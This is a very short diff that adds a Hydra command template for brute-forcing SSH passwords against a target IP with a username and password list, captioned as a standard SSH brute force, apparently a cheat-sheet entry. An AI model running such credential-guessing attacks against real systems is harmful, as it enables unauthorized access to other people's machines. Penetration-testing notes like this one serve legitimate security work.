@@ -1,0 +1,3 @@
+hydra -l <username> -P <password_list> <target_ip> ssh
+
+ssh standard brute force
